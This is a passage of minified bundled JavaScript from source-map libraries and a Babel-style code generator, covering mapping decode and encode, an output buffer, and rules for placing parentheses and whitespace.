Y9=b(l,t1);this.resolvedSources=u1.map(Y9);let{mappings:M0}=X1;if(typeof M0==="string")this._encoded=M0,this._decoded=void 0;else if(Array.isArray(M0))this._encoded=void 0,this._decoded=J1(M0,p);else if(X1.sections)throw Error("TraceMap passed sectioned source map, please use FlattenMap export instead");else throw Error(`invalid source map: ${JSON.stringify(X1)}`);this._decodedMemo=F1(),this._bySources=void 0,this._bySourceMemos=void 0}};function d(f){return f}function z1(f){var l,p;return(p=(l=d(f))._encoded)!=null?p:l._encoded=(0,I.encode)(d(f)._decoded)}function P(f){var l;return(l=d(f))._decoded||(l._decoded=(0,I.decode)(d(f)._encoded))}function g(f,l,p){let X1=P(f);if(l>=X1.length)return null;let N1=X1[l],j1=a1(N1,d(f)._decodedMemo,l,p,C0);return j1===-1?null:N1[j1]}function t(f,l){let{line:p,column:X1,bias:N1}=l;if(p--,p<0)throw Error(L1);if(X1<0)throw Error(G0);let j1=P(f);if(p>=j1.length)return B9(null,null,null,null);let r1=j1[p],t1=a1(r1,d(f)._decodedMemo,p,X1,N1||C0);if(t1===-1)return B9(null,null,null,null);let u1=r1[t1];if(u1.length===1)return B9(null,null,null,null);let{names:$0,resolvedSources:Y9}=f;return B9(Y9[u1[L]],u1[N]+1,u1[k],u1.length===5?$0[u1[_]]:null)}function U1(f,l){let{source:p,line:X1,column:N1,bias:j1}=l;return R6(f,p,X1,N1,j1||C0,!1)}function $1(f,l){let{source:p,line:X1,column:N1,bias:j1}=l;return R6(f,p,X1,N1,j1||U0,!0)}function d1(f,l){let p=P(f),{names:X1,resolvedSources:N1}=f;for(let j1=0;j1<p.length;j1++){let r1=p[j1];for(let t1=0;t1<r1.length;t1++){let u1=r1[t1],$0=j1+1,Y9=u1[0],M0=null,T0=null,M9=null,e9=null;if(u1.length!==1)M0=N1[u1[1]],T0=u1[2]+1,M9=u1[3];if(u1.length===5)e9=X1[u1[4]];l({generatedLine:$0,generatedColumn:Y9,source:M0,originalLine:T0,originalColumn:M9,name:e9})}}}function U9(f,l){let{sources:p,resolvedSources:X1}=f,N1=p.indexOf(l);if(N1===-1)N1=X1.indexOf(l);return N1}function Z9(f,l){let{sourcesContent:p}=f;if(p==null)return null;let X1=U9(f,l);return X1===-1?null:p[X1]}function q9(f,l){let{ignoreList:p}=f;if(p==null)return!1;let X1=U9(f,l);return X1===-1?!1:p.includes(X1)}function o9(f,l){let p=new n(i0(f,[]),l);return d(p)._decoded=f.mappings,p}function t9(f){return i0(f,P(f))}function F6(f){return i0(f,z1(f))}function i0(f,l){return{version:f.version,file:f.file,names:f.names,sourceRoot:f.sourceRoot,sources:f.sources,sourcesContent:f.sourcesContent,mappings:l,ignoreList:f.ignoreList||f.x_google_ignoreList}}function B9(f,l,p,X1){return{source:f,line:l,column:p,name:X1}}function B0(f,l){return{line:f,column:l}}function a1(f,l,p,X1,N1){let j1=f1(f,X1,l,p);if(r)j1=(N1===U0?m:W1)(f,X1,j1);else if(N1===U0)j1++;if(j1===-1||j1===f.length)return-1;return j1}function g0(f,l,p,X1,N1){let j1=a1(f,l,p,X1,C0);if(!r&&N1===U0)j1++;if(j1===-1||j1===f.length)return[];let r1=r?X1:f[j1][h];if(!r)j1=W1(f,r1,j1);let t1=m(f,r1,j1),u1=[];for(;j1<=t1;j1++){let $0=f[j1];u1.push(B0($0[c]+1,$0[a]))}return u1}function R6(f,l,p,X1,N1,j1){var r1;if(p--,p<0)throw Error(L1);if(X1<0)throw Error(G0);let{sources:t1,resolvedSources:u1}=f,$0=t1.indexOf(l);if($0===-1)$0=u1.indexOf(l);if($0===-1)return j1?[]:B0(null,null);let M0=((r1=d(f))._bySources||(r1._bySources=b1(P(f),d(f)._bySourceMemos=t1.map(F1))))[$0][p];if(M0==null)return j1?[]:B0(null,null);let T0=d(f)._bySourceMemos[$0];if(j1)return g0(M0,T0,p,X1,N1);let M9=a1(M0,T0,p,X1,N1);if(M9===-1)return B0(null,null);let e9=M0[M9];return B0(e9[c]+1,e9[a])}})});var OB=v((VW,q7)=>{(function(X,J){if(typeof VW==="object"&&typeof q7<"u")J(q7,WW(),$W()),q7.exports=Q(q7);else if(typeof define==="function"&&define.amd)define(["module","@jridgewell/sourcemap-codec","@jridgewell/trace-mapping"],function(Y){J.apply(this,arguments),Y.exports=Q(Y)});else{let Y={exports:{}};J(Y,X.sourcemapCodec,X.traceMapping),X=typeof globalThis<"u"?globalThis:X||self,X.genMapping=Q(Y)}function Q(Y){return"default"in Y.exports?Y.exports.default:Y.exports}})(VW,function(X,J,Q){var{create:Y,defineProperty:W,getOwnPropertyDescriptor:G,getOwnPropertyNames:H,getPrototypeOf:z}=Object,$=Object.prototype.hasOwnProperty,V=(n,d)=>function(){return d||(0,n[H(n)[0]])((d={exports:{}}).exports,d),d.exports},K=(n,d)=>{for(var z1 in d)W(n,z1,{get:d[z1],enumerable:!0})},Z=(n,d,z1,P)=>{if(d&&typeof d==="object"||typeof d==="function"){for(let g of H(d))if(!$.call(n,g)&&g!==z1)W(n,g,{get:()=>d[g],enumerable:!(P=G(d,g))||P.enumerable})}return n},q=(n,d,z1)=>(z1=n!=null?Y(z(n)):{},Z(d||!n||!n.__esModule?W(z1,"default",{value:n,enumerable:!0}):z1,n)),B=(n)=>Z(W({},"__esModule",{value:!0}),n),M=V({"umd:@jridgewell/sourcemap-codec"(n,d){d.exports=J}}),O=V({"umd:@jridgewell/trace-mapping"(n,d){d.exports=Q}}),R={};K(R,{GenMapping:()=>_1,addMapping:()=>r,addSegment:()=>k1,allMappings:()=>X0,fromMap:()=>p1,maybeAddMapping:()=>m,maybeAddSegment:()=>y,setIgnore:()=>F1,setSourceContent:()=>W1,toDecodedMap:()=>f1,toEncodedMap:()=>b1}),X.exports=B(R);var I=class{constructor(){this._indexes={__proto__:null},this.array=[]}};function F(n){return n}function T(n,d){return F(n)._indexes[d]}function b(n,d){let z1=T(n,d);if(z1!==void 0)return z1;let{array:P,_indexes:g}=F(n),t=P.push(d);return g[d]=t-1}function h(n,d){let z1=T(n,d);if(z1===void 0)return;let{array:P,_indexes:g}=F(n);for(let t=z1+1;t<P.length;t++){let U1=P[t];P[t-1]=U1,g[U1]--}g[d]=void 0,P.pop()}var L=q(M()),N=q(O()),k=0,_=1,c=2,a=3,J1=4,q1=-1,_1=class{constructor({file:n,sourceRoot:d}={}){this._names=new I,this._sources=new I,this._sourcesContent=[],this._mappings=[],this.file=n,this.sourceRoot=d,this._ignoreList=new I}};function M1(n){return n}function k1(n,d,z1,P,g,t,U1,$1){return m1(!1,n,d,z1,P,g,t,U1,$1)}function r(n,d){return C0(!1,n,d)}var y=(n,d,z1,P,g,t,U1,$1)=>{return m1(!0,n,d,z1,P,g,t,U1,$1)},m=(n,d)=>{return C0(!0,n,d)};function W1(n,d,z1){let{_sources:P,_sourcesContent:g}=M1(n),t=b(P,d);g[t]=z1}function F1(n,d,z1=!0){let{_sources:P,_sourcesContent:g,_ignoreList:t}=M1(n),U1=b(P,d);if(U1===g.length)g[U1]=null;if(z1)b(t,U1);else h(t,U1)}function f1(n){let{_mappings:d,_sources:z1,_sourcesContent:P,_names:g,_ignoreList:t}=M1(n);return i(d),{version:3,file:n.file||void 0,names:g.array,sourceRoot:n.sourceRoot||void 0,sources:z1.array,sourcesContent:P,mappings:d,ignoreList:t.array}}function b1(n){let d=f1(n);return Object.assign({},d,{mappings:(0,L.encode)(d.mappings)})}function p1(n){let d=new N.TraceMap(n),z1=new _1({file:d.file,sourceRoot:d.sourceRoot});if(L1(M1(z1)._names,d.names),L1(M1(z1)._sources,d.sources),M1(z1)._sourcesContent=d.sourcesContent||d.sources.map(()=>null),M1(z1)._mappings=(0,N.decodedMappings)(d),d.ignoreList)L1(M1(z1)._ignoreList,d.ignoreList);return z1}function X0(n){let d=[],{_mappings:z1,_sources:P,_names:g}=M1(n);for(let t=0;t<z1.length;t++){let U1=z1[t];for(let $1=0;$1<U1.length;$1++){let d1=U1[$1],U9={line:t+1,column:d1[k]},Z9=void 0,q9=void 0,o9=void 0;if(d1.length!==1){if(Z9=P.array[d1[_]],q9={line:d1[c]+1,column:d1[a]},d1.length===5)o9=g.array[d1[J1]]}d.push({generated:U9,source:Z9,original:q9,name:o9})}}return d}function m1(n,d,z1,P,g,t,U1,$1,d1){let{_mappings:U9,_sources:Z9,_sourcesContent:q9,_names:o9}=M1(d),t9=J0(U9,z1),F6=o1(t9,P);if(!g){if(n&&G0(t9,F6))return;return v1(t9,F6,[P])}C1(t),C1(U1);let i0=b(Z9,g),B9=$1?b(o9,$1):q1;if(i0===q9.length)q9[i0]=d1!=null?d1:null;if(n&&U0(t9,F6,i0,t,U1,B9))return;return v1(t9,F6,$1?[P,i0,t,U1,B9]:[P,i0,t,U1])}function C1(n){}function J0(n,d){for(let z1=n.length;z1<=d;z1++)n[z1]=[];return n[d]}function o1(n,d){let z1=n.length;for(let P=z1-1;P>=0;z1=P--){let g=n[P];if(d>=g[k])break}return z1}function v1(n,d,z1){for(let P=n.length;P>d;P--)n[P]=n[P-1];n[d]=z1}function i(n){let{length:d}=n,z1=d;for(let P=z1-1;P>=0;z1=P,P--)if(n[P].length>0)break;if(z1<d)n.length=z1}function L1(n,d){for(let z1=0;z1<d.length;z1++)b(n,d[z1])}function G0(n,d){if(d===0)return!0;return n[d-1].length===1}function U0(n,d,z1,P,g,t){if(d===0)return!1;let U1=n[d-1];if(U1.length===1)return!1;return z1===U1[_]&&P===U1[c]&&g===U1[a]&&t===(U1.length===5?U1[J1]:q1)}function C0(n,d,z1){let{generated:P,source:g,original:t,name:U1,content:$1}=z1;if(!g)return m1(n,d,P.line-1,P.column,null,null,null,null,null);return C1(t),m1(n,d,P.line-1,P.column,g,t.line-1,t.column,U1,$1)}})});var DB=v((RB)=>{Object.defineProperty(RB,"__esModule",{value:!0});RB.default=void 0;var VX=OB(),KW=$W();class FB{constructor(X,J){var Q;this._map=void 0,this._rawMappings=void 0,this._sourceFileName=void 0,this._lastGenLine=0,this._lastSourceLine=0,this._lastSourceColumn=0,this._inputMap=void 0;let Y=this._map=new VX.GenMapping({sourceRoot:X.sourceRoot});if(this._sourceFileName=(Q=X.sourceFileName)==null?void 0:Q.replace(/\\/g,"/"),this._rawMappings=void 0,X.inputSourceMap){this._inputMap=new KW.TraceMap(X.inputSourceMap);let G=this._inputMap.resolvedSources;if(G.length)for(let H=0;H<G.length;H++){var W;(0,VX.setSourceContent)(Y,G[H],(W=this._inputMap.sourcesContent)==null?void 0:W[H])}}if(typeof J==="string"&&!X.inputSourceMap)(0,VX.setSourceContent)(Y,this._sourceFileName,J);else if(typeof J==="object")for(let G of Object.keys(J))(0,VX.setSourceContent)(Y,G.replace(/\\/g,"/"),J[G])}get(){return(0,VX.toEncodedMap)(this._map)}getDecoded(){return(0,VX.toDecodedMap)(this._map)}getRawMappings(){return this._rawMappings||(this._rawMappings=(0,VX.allMappings)(this._map))}mark(X,J,Q,Y,W,G){var H;this._rawMappings=void 0;let z;if(J!=null)if(this._inputMap){if(z=(0,KW.originalPositionFor)(this._inputMap,{line:J,column:Q}),!z.name&&W){let $=(0,KW.originalPositionFor)(this._inputMap,W);if($.name)Y=$.name}}else z={source:(G==null?void 0:G.replace(/\\/g,"/"))||this._sourceFileName,line:J,column:Q};(0,VX.maybeAddMapping)(this._map,{name:Y,generated:X,source:(H=z)==null?void 0:H.source,original:z})}}RB.default=FB});var IB=v((NB)=>{Object.defineProperty(NB,"__esModule",{value:!0});NB.default=void 0;class wB{constructor(X,J){this._map=null,this._buf="",this._str="",this._appendCount=0,this._last=0,this._queue=[],this._queueCursor=0,this._canMarkIdName=!0,this._indentChar="",this._fastIndentations=[],this._position={line:1,column:0},this._sourcePosition={identifierName:void 0,identifierNamePos:void 0,line:void 0,column:void 0,filename:void 0},this._map=X,this._indentChar=J;for(let Q=0;Q<64;Q++)this._fastIndentations.push(J.repeat(Q));this._allocQueue()}_allocQueue(){let X=this._queue;for(let J=0;J<16;J++)X.push({char:0,repeat:1,line:void 0,column:void 0,identifierName:void 0,identifierNamePos:void 0,filename:""})}_pushQueue(X,J,Q,Y,W){let G=this._queueCursor;if(G===this._queue.length)this._allocQueue();let H=this._queue[G];H.char=X,H.repeat=J,H.line=Q,H.column=Y,H.filename=W,this._queueCursor++}_popQueue(){if(this._queueCursor===0)throw Error("Cannot pop from empty queue");return this._queue[--this._queueCursor]}get(){this._flush();let X=this._map,J={code:(this._buf+this._str).trimRight(),decodedMap:X==null?void 0:X.getDecoded(),get __mergedMap(){return this.map},get map(){let Q=X?X.get():null;return J.map=Q,Q},set map(Q){Object.defineProperty(J,"map",{value:Q,writable:!0})},get rawMappings(){let Q=X==null?void 0:X.getRawMappings();return J.rawMappings=Q,Q},set rawMappings(Q){Object.defineProperty(J,"rawMappings",{value:Q,writable:!0})}};return J}append(X,J){this._flush(),this._append(X,this._sourcePosition,J)}appendChar(X){this._flush(),this._appendChar(X,1,this._sourcePosition)}queue(X){if(X===10)while(this._queueCursor!==0){let Q=this._queue[this._queueCursor-1].char;if(Q!==32&&Q!==9)break;this._queueCursor--}let J=this._sourcePosition;this._pushQueue(X,1,J.line,J.column,J.filename)}queueIndentation(X){if(X===0)return;this._pushQueue(-1,X,void 0,void 0,void 0)}_flush(){let X=this._queueCursor,J=this._queue;for(let Q=0;Q<X;Q++){let Y=J[Q];this._appendChar(Y.char,Y.repeat,Y)}this._queueCursor=0}_appendChar(X,J,Q){if(this._last=X,X===-1){let Y=this._fastIndentations[J];if(Y!==void 0)this._str+=Y;else this._str+=J>1?this._indentChar.repeat(J):this._indentChar}else this._str+=J>1?String.fromCharCode(X).repeat(J):String.fromCharCode(X);if(X!==10)this._mark(Q.line,Q.column,Q.identifierName,Q.identifierNamePos,Q.filename),this._position.column+=J;else this._position.line++,this._position.column=0;if(this._canMarkIdName)Q.identifierName=void 0,Q.identifierNamePos=void 0}_append(X,J,Q){let Y=X.length,W=this._position;if(this._last=X.charCodeAt(Y-1),++this._appendCount>4096)+this._str,this._buf+=this._str,this._str=X,this._appendCount=0;else this._str+=X;if(!Q&&!this._map){W.column+=Y;return}let{column:G,identifierName:H,identifierNamePos:z,filename:$}=J,V=J.line;if((H!=null||z!=null)&&this._canMarkIdName)J.identifierName=void 0,J.identifierNamePos=void 0;let K=X.indexOf(`
`),Z=0;if(K!==0)this._mark(V,G,H,z,$);while(K!==-1){if(W.line++,W.column=0,Z=K+1,Z<Y&&V!==void 0)this._mark(++V,0,null,null,$);K=X.indexOf(`
`,Z)}W.column+=Y-Z}_mark(X,J,Q,Y,W){var G;(G=this._map)==null||G.mark(this._position,X,J,Q,Y,W)}removeTrailingNewline(){let X=this._queueCursor;if(X!==0&&this._queue[X-1].char===10)this._queueCursor--}removeLastSemicolon(){let X=this._queueCursor;if(X!==0&&this._queue[X-1].char===59)this._queueCursor--}getLastChar(){let X=this._queueCursor;return X!==0?this._queue[X-1].char:this._last}getNewlineCount(){let X=this._queueCursor,J=0;if(X===0)return this._last===10?1:0;for(let Q=X-1;Q>=0;Q--){if(this._queue[Q].char!==10)break;J++}return J===X&&this._last===10?J+1:J}endsWithCharAndNewline(){let X=this._queue,J=this._queueCursor;if(J!==0){if(X[J-1].char!==10)return;if(J>1)return X[J-2].char;else return this._last}}hasContent(){return this._queueCursor!==0||!!this._last}exactSource(X,J){if(!this._map){J();return}this.source("start",X);let Q=X.identifierName,Y=this._sourcePosition;if(Q)this._canMarkIdName=!1,Y.identifierName=Q;if(J(),Q)this._canMarkIdName=!0,Y.identifierName=void 0,Y.identifierNamePos=void 0;this.source("end",X)}source(X,J){if(!this._map)return;this._normalizePosition(X,J,0)}sourceWithOffset(X,J,Q){if(!this._map)return;this._normalizePosition(X,J,Q)}_normalizePosition(X,J,Q){let Y=J[X],W=this._sourcePosition;if(Y)W.line=Y.line,W.column=Math.max(Y.column+Q,0),W.filename=J.filename}getCurrentColumn(){let X=this._queue,J=this._queueCursor,Q=-1,Y=0;for(let W=0;W<J;W++){let G=X[W];if(G.char===10)Q=Y;Y+=G.repeat}return Q===-1?this._position.column+Y:Y-1-Q}getCurrentLine(){let X=0,J=this._queue;for(let Q=0;Q<this._queueCursor;Q++)if(J[Q].char===10)X++;return this._position.line+X}}NB.default=wB});var kB=v((_B)=>{Object.defineProperty(_B,"__esModule",{value:!0});_B.nodes=void 0;var wZ1=y1(),{FLIPPED_ALIAS_KEYS:NZ1,isArrayExpression:LZ1,isAssignmentExpression:PB,isBinary:SB,isBlockStatement:IZ1,isCallExpression:TB,isFunction:B7,isIdentifier:K4,isLiteral:CZ1,isMemberExpression:UW,isObjectExpression:PZ1,isOptionalCallExpression:SZ1,isOptionalMemberExpression:TZ1,isStringLiteral:_Z1}=wZ1;function a8(X,J){if(!X)return J;if(UW(X)||TZ1(X)){if(a8(X.object,J),X.computed)a8(X.property,J)}else if(SB(X)||PB(X))a8(X.left,J),a8(X.right,J);else if(TB(X)||SZ1(X))J.hasCall=!0,a8(X.callee,J);else if(B7(X))J.hasFunction=!0;else if(K4(X))J.hasHelper=J.hasHelper||X.callee&&b6(X.callee);return J}function CB(X){return a8(X,{hasCall:!1,hasFunction:!1,hasHelper:!1})}function b6(X){if(!X)return!1;if(UW(X))return b6(X.object)||b6(X.property);else if(K4(X))return X.name==="require"||X.name.charCodeAt(0)===95;else if(TB(X))return b6(X.callee);else if(SB(X)||PB(X))return K4(X.left)&&b6(X.left)||b6(X.right);else return!1}function EZ1(X){return CZ1(X)||PZ1(X)||LZ1(X)||K4(X)||UW(X)}var cX=_B.nodes={AssignmentExpression(X){let J=CB(X.right);if(J.hasCall&&J.hasHelper||J.hasFunction)return J.hasFunction?3:2},SwitchCase(X,J){return(!!X.consequent.length||J.cases[0]===X?1:0)|(!X.consequent.length&&J.cases[J.cases.length-1]===X?2:0)},LogicalExpression(X){if(B7(X.left)||B7(X.right))return 2},Literal(X){if(_Z1(X)&&X.value==="use strict")return 2},CallExpression(X){if(B7(X.callee)||b6(X))return 3},OptionalCallExpression(X){if(B7(X.callee))return 3},VariableDeclaration(X){for(let J=0;J<X.declarations.length;J++){let Q=X.declarations[J],Y=b6(Q.id)&&!EZ1(Q.init);if(!Y&&Q.init){let W=CB(Q.init);Y=b6(Q.init)&&W.hasCall||W.hasFunction}if(Y)return 3}},IfStatement(X){if(IZ1(X.consequent))return 3}};cX.ObjectProperty=cX.ObjectTypeProperty=cX.ObjectMethod=function(X,J){if(J.properties[0]===X)return 1};cX.ObjectTypeCallProperty=function(X,J){var Q;if(J.callProperties[0]===X&&!((Q=J.properties)!=null&&Q.length))return 1};cX.ObjectTypeIndexer=function(X,J){var Q,Y;if(J.indexers[0]===X&&!((Q=J.properties)!=null&&Q.length)&&!((Y=J.callProperties)!=null&&Y.length))return 1};cX.ObjectTypeInternalSlot=function(X,J){var Q,Y,W;if(J.internalSlots[0]===X&&!((Q=J.properties)!=null&&Q.length)&&!((Y=J.callProperties)!=null&&Y.length)&&!((W=J.indexers)!=null&&W.length))return 1};[["Function",!0],["Class",!0],["Loop",!0],["LabeledStatement",!0],["SwitchStatement",!0],["TryStatement",!0]].forEach(function([X,J]){[X].concat(NZ1[X]||[]).forEach(function(Q){let Y=J?3:0;cX[Q]=()=>Y})})});var uB=v((mB)=>{Object.defineProperty(mB,"__esModule",{value:!0});mB.AssignmentExpression=Vq1;mB.Binary=hB;mB.BinaryExpression=Yq1;mB.ClassExpression=Hq1;mB.ArrowFunctionExpression=mB.ConditionalExpression=gB;mB.DoExpression=iZ1;mB.FunctionExpression=zq1;mB.FunctionTypeAnnotation=lZ1;mB.Identifier=Uq1;mB.LogicalExpression=Kq1;mB.NullableTypeAnnotation=cZ1;mB.ObjectExpression=dZ1;mB.OptionalIndexedAccessType=aZ1;mB.OptionalCallExpression=mB.OptionalMemberExpression=$q1;mB.SequenceExpression=Wq1;mB.TSSatisfiesExpression=mB.TSAsExpression=nZ1;mB.TSConditionalType=sZ1;mB.TSConstructorType=mB.TSFunctionType=Qq1;mB.TSInferType=eZ1;mB.TSInstantiationExpression=Jq1;mB.TSIntersectionType=tZ1;mB.UnaryLike=mB.TSTypeAssertion=yB;mB.TSTypeOperator=Xq1;mB.TSUnionType=oZ1;mB.IntersectionTypeAnnotation=mB.UnionTypeAnnotation=rZ1;mB.UpdateExpression=pZ1;mB.AwaitExpression=mB.YieldExpression=Gq1;var kZ1=y1(),O9=lX(),{isArrayTypeAnnotation:bZ1,isBinaryExpression:vZ1,isCallExpression:fZ1,isForOfStatement:xZ1,isIndexedAccessType:hZ1,isMemberExpression:fB,isObjectPattern:yZ1,isOptionalMemberExpression:gZ1,isYieldExpression:mZ1,isStatement:uZ1}=kZ1,bB=new Map([["||",0],["??",0],["|>",0],["&&",1],["|",2],["^",3],["&",4],["==",5],["===",5],["!=",5],["!==",5],["<",6],[">",6],["<=",6],[">=",6],["in",6],["instanceof",6],[">>",7],["<<",7],[">>>",7],["+",8],["-",8],["*",9],["/",9],["%",9],["**",10]]);function vB(X,J){if(J==="BinaryExpression"||J==="LogicalExpression")return bB.get(X.operator);if(J==="TSAsExpression"||J==="TSSatisfiesExpression")return bB.get("in")}function ZW(X){return X==="TSAsExpression"||X==="TSSatisfiesExpression"||X==="TSTypeAssertion"}var U4=(X,J)=>{let Q=J.type;return(Q==="ClassDeclaration"||Q==="ClassExpression")&&J.superClass===X},Z4=(X,J)=>{let Q=J.type;return(Q==="MemberExpression"||Q==="OptionalMemberExpression")&&J.object===X||(Q==="CallExpression"||Q==="OptionalCallExpression"||Q==="NewExpression")&&J.callee===X||Q==="TaggedTemplateExpression"&&J.tag===X||Q==="TSNonNullExpression"};function cZ1(X,J){return bZ1(J)}function lZ1(X,J,Q){let Y=J.type;return Y==="UnionTypeAnnotation"||Y==="IntersectionTypeAnnotation"||Y==="ArrayTypeAnnotation"||Boolean(Q&O9.TokenContext.arrowFlowReturnType)}function pZ1(X,J){return Z4(X,J)||U4(X,J)}function xB(X){return Boolean(X&(O9.TokenContext.expressionStatement|O9.TokenContext.arrowBody))}function dZ1(X,J,Q){return xB(Q)}function iZ1(X,J,Q){return!X.async&&Boolean(Q&O9.TokenContext.expressionStatement)}function hB(X,J){let Q=J.type;if(X.type==="BinaryExpression"&&X.operator==="**"&&Q==="BinaryExpression"&&J.operator==="**")return J.left===X;if(U4(X,J))return!0;if(Z4(X,J)||Q==="UnaryExpression"||Q==="SpreadElement"||Q==="AwaitExpression")return!0;let Y=vB(J,Q);if(Y!=null){let W=vB(X,X.type);if(Y===W&&Q==="BinaryExpression"&&J.right===X||Y>W)return!0}return}function rZ1(X,J){let Q=J.type;return Q==="ArrayTypeAnnotation"||Q==="NullableTypeAnnotation"||Q==="IntersectionTypeAnnotation"||Q==="UnionTypeAnnotation"}function aZ1(X,J){return hZ1(J)&&J.objectType===X}function nZ1(X,J){if((J.type==="AssignmentExpression"||J.type==="AssignmentPattern")&&J.left===X)return!0;if(J.type==="BinaryExpression"&&(J.operator==="|"||J.operator==="&")&&X===J.left)return!0;return hB(X,J)}function sZ1(X,J){let Q=J.type;if(Q==="TSArrayType"||Q==="TSIndexedAccessType"&&J.objectType===X||Q==="TSOptionalType"||Q==="TSTypeOperator"||Q==="TSTypeParameter")return!0;if((Q==="TSIntersectionType"||Q==="TSUnionType")&&J.types[0]===X)return!0;if(Q==="TSConditionalType"&&(J.checkType===X||J.extendsType===X))return!0;return!1}function oZ1(X,J){let Q=J.type;return Q==="TSIntersectionType"||Q==="TSTypeOperator"||Q==="TSArrayType"||Q==="TSIndexedAccessType"&&J.objectType===X||Q==="TSOptionalType"}function tZ1(X,J){let Q=J.type;return Q==="TSTypeOperator"||Q==="TSArrayType"||Q==="TSIndexedAccessType"&&J.objectType===X||Q==="TSOptionalType"}function eZ1(X,J){let Q=J.type;if(Q==="TSArrayType"||Q==="TSIndexedAccessType"&&J.objectType===X||Q==="TSOptionalType")return!0;if(X.typeParameter.constraint){if((Q==="TSIntersectionType"||Q==="TSUnionType")&&J.types[0]===X)return!0}return!1}function Xq1(X,J){let Q=J.type;return Q==="TSArrayType"||Q==="TSIndexedAccessType"&&J.objectType===X||Q==="TSOptionalType"}function Jq1(X,J){let Q=J.type;return(Q==="CallExpression"||Q==="OptionalCallExpression"||Q==="NewExpression"||Q==="TSInstantiationExpression")&&!!J.typeParameters}function Qq1(X,J){let Q=J.type;return Q==="TSIntersectionType"||Q==="TSUnionType"||Q==="TSTypeOperator"||Q==="TSOptionalType"||Q==="TSArrayType"||Q==="TSIndexedAccessType"&&J.objectType===X||Q==="TSConditionalType"&&(J.checkType===X||J.extendsType===X)}function Yq1(X,J,Q){return X.operator==="in"&&Boolean(Q&O9.TokenContext.forInOrInitHeadAccumulate)}function Wq1(X,J){let Q=J.type;if(Q==="SequenceExpression"||Q==="ParenthesizedExpression"||Q==="MemberExpression"&&J.property===X||Q==="OptionalMemberExpression"&&J.property===X||Q==="TemplateLiteral")return!1;if(Q==="ClassDeclaration")return!0;if(Q==="ForOfStatement")return J.right===X;if(Q==="ExportDefaultDeclaration")return!0;return!uZ1(J)}function Gq1(X,J){let Q=J.type;return Q==="BinaryExpression"||Q==="LogicalExpression"||Q==="UnaryExpression"||Q==="SpreadElement"||Z4(X,J)||Q==="AwaitExpression"&&mZ1(X)||Q==="ConditionalExpression"&&X===J.test||U4(X,J)||ZW(Q)}function Hq1(X,J,Q){return Boolean(Q&(O9.TokenContext.expressionStatement|O9.TokenContext.exportDefault))}function yB(X,J){return Z4(X,J)||vZ1(J)&&J.operator==="**"&&J.left===X||U4(X,J)}function zq1(X,J,Q){return Boolean(Q&(O9.TokenContext.expressionStatement|O9.TokenContext.exportDefault))}function gB(X,J){let Q=J.type;if(Q==="UnaryExpression"||Q==="SpreadElement"||Q==="BinaryExpression"||Q==="LogicalExpression"||Q==="ConditionalExpression"&&J.test===X||Q==="AwaitExpression"||ZW(Q))return!0;return yB(X,J)}function $q1(X,J){return fZ1(J)&&J.callee===X||fB(J)&&J.object===X}function Vq1(X,J,Q){if(xB(Q)&&yZ1(X.left))return!0;else return gB(X,J)}function Kq1(X,J){let Q=J.type;if(ZW(Q))return!0;if(Q!=="LogicalExpression")return!1;switch(X.operator){case"||":return J.operator==="??"||J.operator==="&&";case"&&":return J.operator==="??";case"??":return J.operator!=="??"}}function Uq1(X,J,Q,Y){var W;let G=J.type;if((W=X.extra)!=null&&W.parenthesized&&G==="AssignmentExpression"&&J.left===X){let H=J.right.type;if((H==="FunctionExpression"||H==="ClassExpression")&&J.right.id==null)return!0}if(Y&&Y(X)!==X.name)return!1;if(X.name==="let"){if((fB(J,{object:X,computed:!0})||gZ1(J,{object:X,computed:!0,optional:!1}))&&Q&(O9.TokenContext.expressionStatement|O9.TokenContext.forInitHead|O9.TokenContext.forInHead))return!0;return Boolean(Q&O9.TokenContext.forOfHead)}return X.name==="async"&&xZ1(J,{left:X,await:!1})}});var lX=v((dB)=>{Object.defineProperty(dB,"__esModule",{value:!0});dB.TokenContext=void 0;dB.isLastChild=XB1;dB.needsParens=eq1;dB.needsWhitespace=BW;dB.needsWhitespaceAfter=tq1;dB.needsWhitespaceBefore=oq1;var gq1=kB(),mq1=uB(),uq1=y1(),{FLIPPED_ALIAS_KEYS:cq1,VISITOR_KEYS:lq1,isCallExpression:cB,isDecorator:pq1,isExpressionStatement:dq1,isMemberExpression:iq1,isNewExpression:rq1,isParenthesizedExpression:aq1}=uq1,tn1=dB.TokenContext={normal:0,expressionStatement:1,arrowBody:2,exportDefault:4,arrowFlowReturnType:8,forInitHead:16,forInHead:32,forOfHead:64,forInOrInitHeadAccumulate:128,forInOrInitHeadAccumulatePassThroughMask:128};function lB(X){let J=new Map;function Q(Y,W){let G=J.get(Y);J.set(Y,G?function(H,z,$,V){var K;return(K=G(H,z,$,V))!=null?K:W(H,z,$,V)}:W)}for(let Y of Object.keys(X)){let W=cq1[Y];if(W)for(let G of W)Q(G,X[Y]);else Q(Y,X[Y])}return J}var nq1=lB(mq1),sq1=lB(gq1.nodes);function pB(X){if(cB(X))return!0;return iq1(X)&&pB(X.object)}function BW(X,J,Q){var Y;if(!X)return!1;if(dq1(X))X=X.expression;let W=(Y=sq1.get(X.type))==null?void 0:Y(X,J);if(typeof W==="number")return(W&Q)!==0;return!1}function oq1(X,J){return BW(X,J,1)}function tq1(X,J){return BW(X,J,2)}function eq1(X,J,Q,Y){var W;if(!J)return!1;if(rq1(J)&&J.callee===X){if(pB(X))return!0}if(pq1(J))return!qW(X)&&!(cB(X)&&qW(X.callee))&&!aq1(X);return(W=nq1.get(X.type))==null?void 0:W(X,J,Q,Y)}function qW(X){switch(X.type){case"Identifier":return!0;case"MemberExpression":return!X.computed&&X.property.type==="Identifier"&&qW(X.object);default:return!1}}function XB1(X,J){let Q=lq1[X.type];for(let Y=Q.length-1;Y>=0;Y--){let W=X[Q[Y]];if(W===J)return!0;else if(Array.isArray(W)){let G=W.length-1;while(G>=0&&W[G]===null)G--;return G>=0&&W[G]===J}else if(W)return!1}return!1}});var sB=v((aB)=>{Object.defineProperty(aB,"__esModule",{value:!0});aB.TokenMap=void 0;var HB1=y1(),{traverseFast:zB1,VISITOR_KEYS:$B1}=HB1;class rB{constructor(X,J,Q){this._tokens=void 0,this._source=void 0,this._nodesToTokenIndexes=new Map,this._nodesOccurrencesCountCache=new Map,this._tokensCache=new Map,this._tokens=J,this._source=Q,zB1(X,(Y)=>{let W=this._getTokensIndexesOfNode(Y);if(W.length>0)this._nodesToTokenIndexes.set(Y,W)}),this._tokensCache=null}has(X){return this._nodesToTokenIndexes.has(X)}getIndexes(X){return this._nodesToTokenIndexes.get(X)}find(X,J){let Q=this._nodesToTokenIndexes.get(X);if(Q)for(let Y=0;Y<Q.length;Y++){let 